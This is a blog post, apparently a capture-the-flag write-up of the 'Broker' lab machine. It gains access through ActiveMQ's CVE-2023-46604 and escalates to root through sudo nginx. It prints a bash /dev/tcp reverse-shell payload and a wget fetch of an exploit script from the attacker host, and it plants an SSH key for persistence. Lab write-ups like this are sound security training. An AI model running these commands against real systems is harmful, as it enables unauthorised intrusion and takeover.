---
layout: post
title: "broker"
date: 2025-08-30 
categories: ctf
---
# broker

First enumerate ports and services:

```bash
sudo nmap -sC -sV 10.10.11.243 -oN nmap/broker

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let’s visit the site. We get prompt login, let’s try admin:admin. We are in:

![image.png]({{ site.baseurl }}/assets/broker/image.png)

Searching up ActiveMQ, we learn that it operates on port 61616:

```bash
sudo nmap -sC -sV 10.10.11.243 -p 61616

PORT      STATE SERVICE  VERSION
61616/tcp open  apachemq ActiveMQ OpenWire transport 5.15.15

```

We get the version.

Searching up the following: activemq version 5.15.15 exploit github; we find this https://github.com/evkl1d/CVE-2023-46604

Let’s git clone the repo:

```bash
git clone https://github.com/evkl1d/CVE-2023-46604.git
```

Now change the IP in poc.xml:

```bash
<value>bash -i &gt;&amp; /dev/tcp/10.10.16.2/9001 0&gt;&amp;1</value>
```

Host it on a simple python server and start a listener for the reverse shell:

```bash
python3 -m http.server 8001

nc -lnvp 9001
```

Now execute the exploit:

```bash
python exploit.py -i <target-ip> -p <target-port> -u <url-to-poc.xml>

python exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.16.2:8001/poc.xml
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/broker/image%201.png)

Let’s get ssh access and maintain persistence. 

```bash
#Let's create a ssh key on attack host
ssh-keygen -f activemq
cat activemq.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEhNpSvqSCXSvmDjjeeQdX+sbRx/I8ISmjaBgP19B0S2 kali@kali
#Now cat the content and echo it to authorized_keys on target host
mkdir .ssh
cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEhNpSvqSCXSvmDjjeeQdX+sbRx/I8ISmjaBgP19B0S2 kali@kali" >> authorized_keys

#Now we try to login:
chmod 600 activemq #change to secure permission to allow use of private key

ssh -i activemq activemq@10.10.11.243

```

We are now on ssh.

Let’s check the ports:

```bash
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                         
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*                                   
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                   
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                   
LISTEN 0      4096               *:1883             *:*    users:(("java",pid=946,fd=146))
LISTEN 0      50                 *:8161             *:*    users:(("java",pid=946,fd=154))
LISTEN 0      4096               *:5672             *:*    users:(("java",pid=946,fd=144))
LISTEN 0      4096               *:61613            *:*    users:(("java",pid=946,fd=145))
LISTEN 0      50                 *:61614            *:*    users:(("java",pid=946,fd=148))
LISTEN 0      4096               *:61616            *:*    users:(("java",pid=946,fd=143))
LISTEN 0      50                 *:41141            *:*    users:(("java",pid=946,fd=26)) 
LISTEN 0      128             [::]:22            [::]:*
```

We are not in privileged groups. 

Let’s see if we have any sudo privileges:

```bash
sudo -l

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

We can use nginx.

We search up nginx sudo exploit and find this:

[https://github.com/DylanGrl/nginx_sudo_privesc](https://github.com/DylanGrl/nginx_sudo_privesc)

Let’s try it:

```bash
#on target
wget http://10.10.16.2:8001/exploit.sh
chmod +x exploit.sh
```

The private key should be displayed now. Copy the private key, save it. Then:

```bash
chmod 600 rootkey
ssh -i rootkey root@10.10.11.243
```

We now have root.

![image.png]({{ site.baseurl }}/assets/broker/image%202.png)